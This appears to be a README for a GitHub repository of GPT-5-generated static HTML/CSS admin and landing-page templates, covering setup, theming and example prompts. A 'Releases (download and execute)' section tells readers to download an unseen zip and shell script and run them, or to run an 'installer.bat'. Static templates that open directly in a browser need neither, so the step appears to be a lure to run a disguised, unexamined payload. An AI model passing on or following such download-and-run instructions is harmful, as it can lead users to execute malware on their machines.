# Void GPT-5 Templates — Modern Admin & Landing UI Kit & Tools

A collection of GPT-5 generated templates and UI mock-ups for admin dashboards, landing pages, and UI components. Most files act as smart mock-ups. You can turn them into working apps with a few clear prompts to GPT-5 or by wiring small JS/CSS snippets.

Live assets, builds and packaged releases are on the Releases page:

Why this repo
- Save design time. Use templates to prototype UI and UX fast.
- Test layout ideas with working HTML/CSS starter code.

- Build admin panels that pair well with modern frontends and microservices.

What you get
- Several HTML/CSS layouts for admin dashboards and landing pages.
- Reusable components: sidebars, cards, tables, modals, forms.
- JS snippets for UI interactions: toggles, modals, charts hooks.
- A small theme system using CSS variables.
- Example prompts to convert mock-ups into working features using GPT-5.

Featured templates
- Admin Basic: lightweight HTML with responsive grid, simple charts and a table component.
- Admin Modern: sidebar, nested menus, widgets and responsive breakpoints.
- Landing Hero: clean hero, feature sections, CTA and simple form.
- Component Pack: cards, tables, form controls, brand palette, and icon set.

Quick start (local preview)
1. Clone the repo
   git clone https://github.com/iPandaKyo/void-gpt-5-templates.git
2. Open a template in your browser
   - Open templates/admin-basic/index.html
   - Or run a static server:
     npx http-server templates/admin-basic
3. Edit HTML/CSS and reload. CSS variables live in :root in each style.css.

Releases (download and execute)
Download the packaged release and run the installer script from the Releases page:
https://github.com/iPandaKyo/void-gpt-5-templates/releases

From the Releases page, download the file void-gpt-5-templates-latest.zip and the helper script void-gpt5-templates-run.sh. Extract the zip and execute the script. On macOS/Linux:
  unzip void-gpt-5-templates-latest.zip
  chmod +x void-gpt5-templates-run.sh
  ./void-gpt5-templates-run.sh

On Windows, download the zip and run the included installer.bat or start the desired index.html files directly.

How to turn a mock-up into a working app with GPT-5
1. Identify the feature you want: data table with filters, chart with real data, or auth flow.
2. Provide the template file and a clear prompt. Example prompt:
   "I have this HTML mock-up with a table. Add a JavaScript function that fetches JSON from /api/users, renders rows, adds client-side sorting and debounced search. Keep CSS classes intact."
3. Ask for code only. Insert resulting code into scripts.js or a new module.
4. Test with a dev server and mock API.

Example GPT-5 prompts (practical)
- "Convert this admin mock-up to use Fetch API for loading widget data. Return a plain JS module with functions loadWidgets() and refreshWidget(id)."
- "Add client-side pagination and sorting to the table. Keep markup unchanged. Provide only one JS file."
- "Replace static chart images with Chart.js code. Use a mount point with id='chart-sales' and a sample dataset."

Customization guide
- Theme variables: edit :root variables in style.css. Use --brand, --accent, --bg, --surface, --muted.
- Breakpoints: the templates use simple mobile-first CSS. Change the @media queries to adjust breakpoints.
- Components: copy components from components/ into your page. Each component is self-contained HTML and CSS.
- JavaScript: keep logic minimal. Add API endpoints in scripts.js or import modules.

Design tokens and theme
- The templates use CSS variables for quick theming:
  --brand: primary color
  --accent: secondary color
  --bg: background color
  --surface: card background
  --muted: text muted
- Swap palettes by replacing variables. Use a script to switch themes at runtime.

Integration ideas
- Use these templates as admin frontends for REST or GraphQL backends.
- Add authentication with OAuth or JWT.
- Add real-time updates with WebSockets or SSE.
- Pair with a small backend: Node/Express, Flask, or a serverless function.

Accessibility and performance
- Templates include semantic HTML, aria labels for modals and forms, and keyboard focus styles.
- Keep images optimized and lazy-load heavy assets.
- Use critical CSS for above-the-fold content.

Developer tips
- Test in Chromium-based browsers and Safari.
- Use local HTTP server for modules and Fetch API.
- For charts, include Chart.js or replace with D3 for complex visualizations.
- Keep components small and repeatable.

FAQ
Q: Are these production-ready?
A: The templates aim to speed design and prototyping. Many files are mock-ups. You can make them production-ready by adding server logic, tests and security hardening.

Q: How do I add new templates?
A: Add a new folder under templates/. Include index.html, style.css and scripts.js. Reference components from components/ and add a small README inside the folder.

Q: Can I use these templates commercially?
A: Yes. The repo uses MIT.
